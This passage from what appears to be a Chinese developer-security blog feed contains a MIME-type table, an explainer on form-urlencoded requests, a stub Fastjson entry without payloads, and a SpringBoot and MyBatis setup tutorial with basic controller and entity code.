align="left">.mpe</td><td align="left">video&#x2F;x-mpeg</td></tr><tr><td align="left">.mpeg</td><td align="left">video&#x2F;mpg</td><td align="left">.mpg</td><td align="left">video&#x2F;mpg</td></tr><tr><td align="left">.mpga</td><td align="left">audio&#x2F;rn-mpeg</td><td align="left">.mpp</td><td align="left">application&#x2F;vnd.ms-project</td></tr><tr><td align="left">.mps</td><td align="left">video&#x2F;x-mpeg</td><td align="left">.mpt</td><td align="left">application&#x2F;vnd.ms-project</td></tr><tr><td align="left">.mpv</td><td align="left">video&#x2F;mpg</td><td align="left">.mpv2</td><td align="left">video&#x2F;mpeg</td></tr><tr><td align="left">.mpw</td><td align="left">application&#x2F;vnd.ms-project</td><td align="left">.mpx</td><td align="left">application&#x2F;vnd.ms-project</td></tr><tr><td align="left">.mtx</td><td align="left">text&#x2F;xml</td><td align="left">.mxp</td><td align="left">application&#x2F;x-mmxp</td></tr><tr><td align="left">.net</td><td align="left">image&#x2F;pnetvue</td><td align="left">.nrf</td><td align="left">application&#x2F;x-nrf</td></tr><tr><td align="left">.nws</td><td align="left">message&#x2F;rfc822</td><td align="left">.odc</td><td align="left">text&#x2F;x-ms-odc</td></tr><tr><td align="left">.out</td><td align="left">application&#x2F;x-out</td><td align="left">.p10</td><td align="left">application&#x2F;pkcs10</td></tr><tr><td align="left">.p12</td><td align="left">application&#x2F;x-pkcs12</td><td align="left">.p7b</td><td align="left">application&#x2F;x-pkcs7-certificates</td></tr><tr><td align="left">.p7c</td><td align="left">application&#x2F;pkcs7-mime</td><td align="left">.p7m</td><td align="left">application&#x2F;pkcs7-mime</td></tr><tr><td align="left">.p7r</td><td align="left">application&#x2F;x-pkcs7-certreqresp</td><td align="left">.p7s</td><td align="left">application&#x2F;pkcs7-signature</td></tr><tr><td align="left">.pc5</td><td align="left">application&#x2F;x-pc5</td><td align="left">.pci</td><td align="left">application&#x2F;x-pci</td></tr><tr><td align="left">.pcl</td><td align="left">application&#x2F;x-pcl</td><td align="left">.pcx</td><td align="left">application&#x2F;x-pcx</td></tr><tr><td align="left">.pdf</td><td align="left">application&#x2F;pdf</td><td align="left">.pdf</td><td align="left">application&#x2F;pdf</td></tr><tr><td align="left">.pdx</td><td align="left">application&#x2F;vnd.adobe.pdx</td><td align="left">.pfx</td><td align="left">application&#x2F;x-pkcs12</td></tr><tr><td align="left">.pgl</td><td align="left">application&#x2F;x-pgl</td><td align="left">.pic</td><td align="left">application&#x2F;x-pic</td></tr><tr><td align="left">.pko</td><td align="left">application&#x2F;vnd.ms-pki.pko</td><td align="left">.pl</td><td align="left">application&#x2F;x-perl</td></tr><tr><td align="left">.plg</td><td align="left">text&#x2F;html</td><td align="left">.pls</td><td align="left">audio&#x2F;scpls</td></tr><tr><td align="left">.plt</td><td align="left">application&#x2F;x-plt</td><td align="left">.png</td><td align="left">image&#x2F;png</td></tr><tr><td align="left">.png</td><td align="left">application&#x2F;x-png</td><td align="left">.pot</td><td align="left">application&#x2F;vnd.ms-powerpoint</td></tr><tr><td align="left">.ppa</td><td align="left">application&#x2F;vnd.ms-powerpoint</td><td align="left">.ppm</td><td align="left">application&#x2F;x-ppm</td></tr><tr><td align="left">.pps</td><td align="left">application&#x2F;vnd.ms-powerpoint</td><td align="left">.ppt</td><td align="left">application&#x2F;vnd.ms-powerpoint</td></tr><tr><td align="left">.ppt</td><td align="left">application&#x2F;x-ppt</td><td align="left">.pr</td><td align="left">application&#x2F;x-pr</td></tr><tr><td align="left">.prf</td><td align="left">application&#x2F;pics-rules</td><td align="left">.prn</td><td align="left">application&#x2F;x-prn</td></tr><tr><td align="left">.prt</td><td align="left">application&#x2F;x-prt</td><td align="left">.ps</td><td align="left">application&#x2F;x-ps</td></tr><tr><td align="left">.ps</td><td align="left">application&#x2F;postscript</td><td align="left">.ptn</td><td align="left">application&#x2F;x-ptn</td></tr><tr><td align="left">.pwz</td><td align="left">application&#x2F;vnd.ms-powerpoint</td><td align="left">.r3t</td><td align="left">text&#x2F;vnd.rn-realtext3d</td></tr><tr><td align="left">.ra</td><td align="left">audio&#x2F;vnd.rn-realaudio</td><td align="left">.ram</td><td align="left">audio&#x2F;x-pn-realaudio</td></tr><tr><td align="left">.ras</td><td align="left">application&#x2F;x-ras</td><td align="left">.rat</td><td align="left">application&#x2F;rat-file</td></tr><tr><td align="left">.rdf</td><td align="left">text&#x2F;xml</td><td align="left">.rec</td><td align="left">application&#x2F;vnd.rn-recording</td></tr><tr><td align="left">.red</td><td align="left">application&#x2F;x-red</td><td align="left">.rgb</td><td align="left">application&#x2F;x-rgb</td></tr><tr><td align="left">.rjs</td><td align="left">application&#x2F;vnd.rn-realsystem-rjs</td><td align="left">.rjt</td><td align="left">application&#x2F;vnd.rn-realsystem-rjt</td></tr><tr><td align="left">.rlc</td><td align="left">application&#x2F;x-rlc</td><td align="left">.rle</td><td align="left">application&#x2F;x-rle</td></tr><tr><td align="left">.rm</td><td align="left">application&#x2F;vnd.rn-realmedia</td><td align="left">.rmf</td><td align="left">application&#x2F;vnd.adobe.rmf</td></tr><tr><td align="left">.rmi</td><td align="left">audio&#x2F;mid</td><td align="left">.rmj</td><td align="left">application&#x2F;vnd.rn-realsystem-rmj</td></tr><tr><td align="left">.rmm</td><td align="left">audio&#x2F;x-pn-realaudio</td><td align="left">.rmp</td><td align="left">application&#x2F;vnd.rn-rn_music_package</td></tr><tr><td align="left">.rms</td><td align="left">application&#x2F;vnd.rn-realmedia-secure</td><td align="left">.rmvb</td><td align="left">application&#x2F;vnd.rn-realmedia-vbr</td></tr><tr><td align="left">.rmx</td><td align="left">application&#x2F;vnd.rn-realsystem-rmx</td><td align="left">.rnx</td><td align="left">application&#x2F;vnd.rn-realplayer</td></tr><tr><td align="left">.rp</td><td align="left">image&#x2F;vnd.rn-realpix</td><td align="left">.rpm</td><td align="left">audio&#x2F;x-pn-realaudio-plugin</td></tr><tr><td align="left">.rsml</td><td align="left">application&#x2F;vnd.rn-rsml</td><td align="left">.rt</td><td align="left">text&#x2F;vnd.rn-realtext</td></tr><tr><td align="left">.rtf</td><td align="left">application&#x2F;msword</td><td align="left">.rtf</td><td align="left">application&#x2F;x-rtf</td></tr><tr><td align="left">.rv</td><td align="left">video&#x2F;vnd.rn-realvideo</td><td align="left">.sam</td><td align="left">application&#x2F;x-sam</td></tr><tr><td align="left">.sat</td><td align="left">application&#x2F;x-sat</td><td align="left">.sdp</td><td align="left">application&#x2F;sdp</td></tr><tr><td align="left">.sdw</td><td align="left">application&#x2F;x-sdw</td><td align="left">.sit</td><td align="left">application&#x2F;x-stuffit</td></tr><tr><td align="left">.slb</td><td align="left">application&#x2F;x-slb</td><td align="left">.sld</td><td align="left">application&#x2F;x-sld</td></tr><tr><td align="left">.slk</td><td align="left">drawing&#x2F;x-slk</td><td align="left">.smi</td><td align="left">application&#x2F;smil</td></tr><tr><td align="left">.smil</td><td align="left">application&#x2F;smil</td><td align="left">.smk</td><td align="left">application&#x2F;x-smk</td></tr><tr><td align="left">.snd</td><td align="left">audio&#x2F;basic</td><td align="left">.sol</td><td align="left">text&#x2F;plain</td></tr><tr><td align="left">.sor</td><td align="left">text&#x2F;plain</td><td align="left">.spc</td><td align="left">application&#x2F;x-pkcs7-certificates</td></tr><tr><td align="left">.spl</td><td align="left">application&#x2F;futuresplash</td><td align="left">.spp</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.ssm</td><td align="left">application&#x2F;streamingmedia</td><td align="left">.sst</td><td align="left">application&#x2F;vnd.ms-pki.certstore</td></tr><tr><td align="left">.stl</td><td align="left">application&#x2F;vnd.ms-pki.stl</td><td align="left">.stm</td><td align="left">text&#x2F;html</td></tr><tr><td align="left">.sty</td><td align="left">application&#x2F;x-sty</td><td align="left">.svg</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.swf</td><td align="left">application&#x2F;x-shockwave-flash</td><td align="left">.tdf</td><td align="left">application&#x2F;x-tdf</td></tr><tr><td align="left">.tg4</td><td align="left">application&#x2F;x-tg4</td><td align="left">.tga</td><td align="left">application&#x2F;x-tga</td></tr><tr><td align="left">.tif</td><td align="left">image&#x2F;tiff</td><td align="left">.tif</td><td align="left">application&#x2F;x-tif</td></tr><tr><td align="left">.tiff</td><td align="left">image&#x2F;tiff</td><td align="left">.tld</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.top</td><td align="left">drawing&#x2F;x-top</td><td align="left">.torrent</td><td align="left">application&#x2F;x-bittorrent</td></tr><tr><td align="left">.tsd</td><td align="left">text&#x2F;xml</td><td align="left">.txt</td><td align="left">text&#x2F;plain</td></tr><tr><td align="left">.uin</td><td align="left">application&#x2F;x-icq</td><td align="left">.uls</td><td align="left">text&#x2F;iuls</td></tr><tr><td align="left">.vcf</td><td align="left">text&#x2F;x-vcard</td><td align="left">.vda</td><td align="left">application&#x2F;x-vda</td></tr><tr><td align="left">.vdx</td><td align="left">application&#x2F;vnd.visio</td><td align="left">.vml</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.vpg</td><td align="left">application&#x2F;x-vpeg005</td><td align="left">.vsd</td><td align="left">application&#x2F;vnd.visio</td></tr><tr><td align="left">.vsd</td><td align="left">application&#x2F;x-vsd</td><td align="left">.vss</td><td align="left">application&#x2F;vnd.visio</td></tr><tr><td align="left">.vst</td><td align="left">application&#x2F;vnd.visio</td><td align="left">.vst</td><td align="left">application&#x2F;x-vst</td></tr><tr><td align="left">.vsw</td><td align="left">application&#x2F;vnd.visio</td><td align="left">.vsx</td><td align="left">application&#x2F;vnd.visio</td></tr><tr><td align="left">.vtx</td><td align="left">application&#x2F;vnd.visio</td><td align="left">.vxml</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.wav</td><td align="left">audio&#x2F;wav</td><td align="left">.wax</td><td align="left">audio&#x2F;x-ms-wax</td></tr><tr><td align="left">.wb1</td><td align="left">application&#x2F;x-wb1</td><td align="left">.wb2</td><td align="left">application&#x2F;x-wb2</td></tr><tr><td align="left">.wb3</td><td align="left">application&#x2F;x-wb3</td><td align="left">.wbmp</td><td align="left">image&#x2F;vnd.wap.wbmp</td></tr><tr><td align="left">.wiz</td><td align="left">application&#x2F;msword</td><td align="left">.wk3</td><td align="left">application&#x2F;x-wk3</td></tr><tr><td align="left">.wk4</td><td align="left">application&#x2F;x-wk4</td><td align="left">.wkq</td><td align="left">application&#x2F;x-wkq</td></tr><tr><td align="left">.wks</td><td align="left">application&#x2F;x-wks</td><td align="left">.wm</td><td align="left">video&#x2F;x-ms-wm</td></tr><tr><td align="left">.wma</td><td align="left">audio&#x2F;x-ms-wma</td><td align="left">.wmd</td><td align="left">application&#x2F;x-ms-wmd</td></tr><tr><td align="left">.wmf</td><td align="left">application&#x2F;x-wmf</td><td align="left">.wml</td><td align="left">text&#x2F;vnd.wap.wml</td></tr><tr><td align="left">.wmv</td><td align="left">video&#x2F;x-ms-wmv</td><td align="left">.wmx</td><td align="left">video&#x2F;x-ms-wmx</td></tr><tr><td align="left">.wmz</td><td align="left">application&#x2F;x-ms-wmz</td><td align="left">.wp6</td><td align="left">application&#x2F;x-wp6</td></tr><tr><td align="left">.wpd</td><td align="left">application&#x2F;x-wpd</td><td align="left">.wpg</td><td align="left">application&#x2F;x-wpg</td></tr><tr><td align="left">.wpl</td><td align="left">application&#x2F;vnd.ms-wpl</td><td align="left">.wq1</td><td align="left">application&#x2F;x-wq1</td></tr><tr><td align="left">.wr1</td><td align="left">application&#x2F;x-wr1</td><td align="left">.wri</td><td align="left">application&#x2F;x-wri</td></tr><tr><td align="left">.wrk</td><td align="left">application&#x2F;x-wrk</td><td align="left">.ws</td><td align="left">application&#x2F;x-ws</td></tr><tr><td align="left">.ws2</td><td align="left">application&#x2F;x-ws</td><td align="left">.wsc</td><td align="left">text&#x2F;scriptlet</td></tr><tr><td align="left">.wsdl</td><td align="left">text&#x2F;xml</td><td align="left">.wvx</td><td align="left">video&#x2F;x-ms-wvx</td></tr><tr><td align="left">.xdp</td><td align="left">application&#x2F;vnd.adobe.xdp</td><td align="left">.xdr</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.xfd</td><td align="left">application&#x2F;vnd.adobe.xfd</td><td align="left">.xfdf</td><td align="left">application&#x2F;vnd.adobe.xfdf</td></tr><tr><td align="left">.xhtml</td><td align="left">text&#x2F;html</td><td align="left">.xls</td><td align="left">application&#x2F;vnd.ms-excel</td></tr><tr><td align="left">.xls</td><td align="left">application&#x2F;x-xls</td><td align="left">.xlw</td><td align="left">application&#x2F;x-xlw</td></tr><tr><td align="left">.xml</td><td align="left">text&#x2F;xml</td><td align="left">.xpl</td><td align="left">audio&#x2F;scpls</td></tr><tr><td align="left">.xq</td><td align="left">text&#x2F;xml</td><td align="left">.xql</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.xquery</td><td align="left">text&#x2F;xml</td><td align="left">.xsd</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.xsl</td><td align="left">text&#x2F;xml</td><td align="left">.xslt</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.xwd</td><td align="left">application&#x2F;x-xwd</td><td align="left">.x_b</td><td align="left">application&#x2F;x-x_b</td></tr><tr><td align="left">.sis</td><td align="left">application&#x2F;vnd.symbian.install</td><td align="left">.sisx</td><td align="left">application&#x2F;vnd.symbian.install</td></tr><tr><td align="left">.x_t</td><td align="left">application&#x2F;x-x_t</td><td align="left">.ipa</td><td align="left">application&#x2F;vnd.iphone</td></tr><tr><td align="left">.apk</td><td align="left">application&#x2F;vnd.android.package-archive</td><td align="left">.xap</td><td align="left">application&#x2F;x-silverlight-app</td></tr></tbody></table><h2 id="Content-Type-application-x-www-form-urlencoded-charset-UTF-8"><a href="#Content-Type-application-x-www-form-urlencoded-charset-UTF-8" class="headerlink" title="Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8"></a>Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</h2><p><code>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</code> 是 HTTP 请求中常见的 <code>Content-Type</code> 值，表示请求体是 <strong>URL 编码的表单数据</strong>，并且使用 <code>UTF-8</code> 字符编码。以下是详细解析：</p><hr><p><strong>1. <code>application/x-www-form-urlencoded</code> 是什么？</strong></p><ul><li>它是一种 MIME 类型，用于表示表单提交的数据。</li><li>表单数据以键值对的形式传输，并通过 URL 编码（URL encoding）进行转义。</li><li>常用于 HTML 表单的默认提交方式，尤其是 <code>POST</code> 请求。</li></ul><p><strong>数据格式示例</strong>：</p><p>一个表单包含两个字段：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1234&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交后，数据会被编码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&amp;password=1234</span><br></pre></td></tr></table></figure><p>编码规则：</p><ul><li>空格被编码为 <code>+</code> 或 <code>%20</code></li><li>特殊字符（如 <code>&amp;</code>, <code>=</code>, <code>%</code> 等）被转义为 <code>%XX</code> 格式。</li></ul><hr><p><strong>2. <code>charset=UTF-8</code> 的作用</strong></p><ul><li>指定请求体使用的字符编码。</li><li><code>UTF-8</code> 是一种支持多种语言字符的编码方式，兼容性和普适性较好。</li><li>如果表单数据包含非 ASCII 字符（如中文、日文等），<code>charset=UTF-8</code> 确保这些字符被正确编码和解析。</li></ul><p><strong>示例</strong>：</p><p>如果表单提交的值为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;你好&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过 URL 编码后，数据可能是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">message=%E4%BD%A0%E5%A5%BD</span><br></pre></td></tr></table></figure><p>（<code>你好</code> 在 UTF-8 编码下被编码为 <code>%E4%BD%A0%E5%A5%BD</code>）</p><hr><p><strong>3. 使用场景</strong></p><ul><li><p>典型场景</p><p>：</p><ul><li>表单提交（默认使用 <code>application/x-www-form-urlencoded</code>）。</li><li>简单的键值对数据传输，例如 API 调用中传递查询参数。</li></ul></li><li><p>适合的数据类型</p><p>：</p><ul><li>键值对结构。</li><li>数据量较小，不包含复杂嵌套。</li></ul></li></ul><hr><p><strong>4. 与其他 <code>Content-Type</code> 的区别</strong></p><ul><li><p><strong><code>application/json</code></strong>:</p><ul><li><p>用于传输 JSON 格式数据。</p></li><li><p>更适合复杂、嵌套结构的数据传输。</p></li><li><p>示例：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>multipart/form-data</code></strong>:</p><ul><li><p>用于文件上传，或混合文本和文件。</p></li><li><p>数据以多部分结构传输。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line">test</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><p><strong>总结</strong></p><p><code>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</code> 是最常用的表单数据格式，适合简单的键值对数据传输。如果你的请求体采用这种格式，服务器会将数据解析为键值对，非常适合模拟表单提交和执行注入测试。</p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson</title>
      <link href="/2025/05/27/Fastjson/"/>
      <url>/2025/05/27/Fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在前后端数据传输交互中,经常会遇到字符串（String）与json，XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。</p><p>Fastjson-组件安全复现</p><ol><li>Maven引用Fastjson</li><li>创建需转换类对象User</li><li>使用Fastjson进行数据转换</li><li>数据转换（对象转Json,Json转对象）</li></ol><p>对象转Json(带类型)</p><p>JSONObject.toJSONString(u)<br>SONObject.toJSONString(u,SerializerFeature.WriteClassName)</p><p>Json转对象</p><p>JSON.parseObject(exp)</p><h1 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103230127718.png" alt="image-20250103230127718"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot</title>
      <link href="/2025/05/27/SpringBoot/"/>
      <url>/2025/05/27/SpringBoot/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Spring Boot是由Pivotal团队提供的一套开源框架，可以简化spring应用的创建及部署。它提供了丰富的Spring模块化支持，可以帮助开发者更轻松快捷地构建出企业级应用。Spring Boot通过自动配置功能，降低了复杂性，同时支持基于JVM的多种开源框架，可以缩短开发时间，使开发更加简单和高效。</p><h1 id="Web应用-路由响应"><a href="#Web应用-路由响应" class="headerlink" title="Web应用-路由响应"></a>Web应用-路由响应</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>选择Spring Initializr</p><p>修改服务器URL：<a href="https://start.aliyun.com(速度更快版本更稳定)/">https://start.aliyun.com（速度更快版本更稳定）</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/c8b889375d0a997eac4bd0cd227440cb.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/f6b35d348436d3fa1070e290641bef59.png" alt="img"></p><p>新建文件controller&#x2F;IndexController</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105212242572.png" alt="image-20250105212242572"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105214314327.png" alt="image-20250105214314327"></p><p>访问错误路由，触发springboot经典报错</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105213521729.png" alt="image-20250105213521729"></p><p>无参数：</p><p>get访问attackxuget，触发getindex方法，页面回显get test</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105213228733.png" alt="image-20250105213228733"></p><p>post访问attackxupost，触发postindex方法，页面回显post test</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105213427716.png" alt="image-20250105213427716"></p><p>有参数：</p><p>get访问attackxu_get，触发get_g方法，页面回显“get test”和传递的参数name值</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105214356505.png" alt="image-20250105214356505"></p><p>get访问attackxu_post，触发post_p方法，页面回显“post test”和传递的参数name值</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105214510637.png" alt="image-20250105214510637"></p><p>代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.attackxu.springboottest.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span><span class="comment">//指示让方法的回显值作为页面的相应内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="comment">//无参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/attackxuget&quot;,method = RequestMethod.GET)</span></span><br><span class="line"><span class="comment">//@GetMapping(&quot;/attackxuget&quot;)或者使用第二种方法声明路由</span></span><br><span class="line">    <span class="comment">//Get路由，当GET访问/attackxuget时会触发getindex方法，回显“get test”</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;get test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/attackxupost&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">postindex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;post test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有参数</span></span><br><span class="line">    <span class="comment">// 指定GET请求的访问路由，带参数名name</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/attackxuget_g&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get_g</span><span class="params">(<span class="meta">@RequestParam</span> String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;get test&quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 指定POST请求的访问路由，带参数名name</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/attackxupost_p&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">post_p</span><span class="params">(<span class="meta">@RequestParam</span> String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;post test&quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数据库应用-Mybatis"><a href="#数据库应用-Mybatis" class="headerlink" title="数据库应用-Mybatis"></a>数据库应用-Mybatis</h1><p>在 JAVA 中分析 SQL 注入，采用什么数据库驱动，其使用访问数据库方法不同，所以造成的安全问题也不同。</p><h2 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105215358626.png" alt="image-20250105215358626"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105215508142.png" alt="image-20250105215508142"></p><p>phpstudy开启mysql</p><h2 id="项目添加-Mybatis-数据库驱动"><a href="#项目添加-Mybatis-数据库驱动" class="headerlink" title="项目添加 Mybatis &amp; 数据库驱动"></a>项目添加 Mybatis &amp; 数据库驱动</h2><ul><li>若创建项目时选择了 MySQL Driver 和 MyBatis Framework 两个依赖，则项目文件 pom.xml 中会自动添加下面内容</li><li>创建项目时若未选择上述两个依赖，则需要手动在 pom.xml 中的 dependencies 标签中添加以下内容</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105220029579.png" alt="image-20250105220029579"></p><h2 id="项目配置数据库连接信息"><a href="#项目配置数据库连接信息" class="headerlink" title="项目配置数据库连接信息"></a>项目配置数据库连接信息</h2><p>默认配置信息文件为 src&#x2F;main&#x2F;resources&#x2F; 目录下的 application.properties，这里手动改为了 application.yml</p><p>然后清空文件内容，写入下面代码</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/demo01</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">        <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105220324322.png" alt="image-20250105220324322"></p><h2 id="创建-User-类用来操作数据库数据"><a href="#创建-User-类用来操作数据库数据" class="headerlink" title="创建 User 类用来操作数据库数据"></a>创建 User 类用来操作数据库数据</h2><p>创建entity.User，生成get()，set()，tostring()方法</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105221144413.png" alt="image-20250105221144413"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.attackxu.springbootmybatils.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span 